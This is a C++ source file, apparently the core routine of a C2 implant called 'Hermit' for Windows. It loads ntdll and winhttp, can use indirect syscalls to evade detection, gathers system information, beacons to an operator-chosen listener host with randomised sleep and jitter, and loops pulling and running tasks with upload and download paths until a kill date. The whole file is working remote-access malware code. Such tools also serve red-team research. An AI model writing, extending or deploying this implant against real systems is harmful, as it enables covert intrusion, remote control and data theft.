#include "hermit.hpp"

namespace Hermit
{
	VOID Run(
		HINSTANCE       hInstance,
		INT 			nCmdShow,
		LPCWSTR			lpPayloadType,
		BOOL			bIndirectSyscalls,
		LPCWSTR			lpProtocol,
		LPCWSTR 		lpHost,
		INTERNET_PORT 	nPort,
		LPCWSTR 		lpReqPathCheckIn,
		LPCWSTR			lpReqPathDownload,
		LPCWSTR 		lpReqPathTaskGet,
		LPCWSTR 		lpReqPathTaskResult,
		LPCWSTR			lpReqPathUpload,
		LPCWSTR			lpReqPathWebSocket,
		INT 			nSleep,
		INT				nJitter,
		INT				nKillDate,
		LPCWSTR 		lpKey,
		LPCWSTR 		lpIV
	) {
		 HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
        if (!hNTDLL)
        {
			return;
        }

        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
        if (!hWinHTTPDLL)
        {
			FreeLibrary(hNTDLL);
            return;
        }

		State::PSTATE pState = new State::STATE;

		pState->pCrypt				= Crypt::InitCrypt(lpKey, lpIV);
		pState->pTeb 				= NtCurrentTeb();
		pState->hNTDLL				= hNTDLL;
		pState->hWinHTTPDLL			= hWinHTTPDLL;
		pState->pProcs 				= Procs::FindProcs(hNTDLL, hWinHTTPDLL, bIndirectSyscalls);
		pState->hInstance 			= hInstance;
		pState->nCmdShow 			= nCmdShow;
		pState->lpPayloadType 		= lpPayloadType;
		pState->bIndirectSyscalls	= bIndirectSyscalls;
		pState->lpListenerProto 	= lpProtocol;
		pState->lpListenerHost 		= lpHost;
		pState->nListenerPort 		= nPort;
		pState->lpReqPathCheckIn 	= lpReqPathCheckIn;
		pState->lpReqPathTaskGet 	= lpReqPathTaskGet;
		pState->lpReqPathTaskResult = lpReqPathTaskResult;
		pState->lpReqPathDownload 	= lpReqPathDownload;
		pState->lpReqPathUpload 	= lpReqPathUpload;
		pState->lpReqPathWebSocket 	= lpReqPathWebSocket;
		pState->nSleep 				= nSleep;
		pState->nJitter 			= nJitter;
		pState->nKillDate 			= nKillDate;
		pState->hSession 			= NULL;
		pState->hConnect 			= NULL;
		pState->hRequest 			= NULL;
		// pState->pSocket 			= NULL;
		pState->bQuit 				= FALSE;

		// Get system information
		std::wstring wInfoJson = Handler::GetInitialInfoJSON(pState);

		Handler::HTTPInit(pState);
		if (pState->hSession == NULL || pState->hConnect == NULL)
		{
			State::Free(pState);
			return;
		}

		// WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);

		// Check-In
		do
		{
			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);

			if (Handler::IsKillDateReached(pState->nKillDate))
				pState->bQuit = TRUE;

			if (Handler::CheckIn(pState, wInfoJson))
				break;
		} while (1 == 1);



		// Tasks
		do
		{
			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);

			if (Handler::IsKillDateReached(pState->nKillDate))
				pState->bQuit = TRUE;

			Handler::Task(pState);

			// Manage socket connections
			// Handler::Socket(pState);
		} while (!pState->bQuit);

		State::Free(pState);
		return;
	}
}

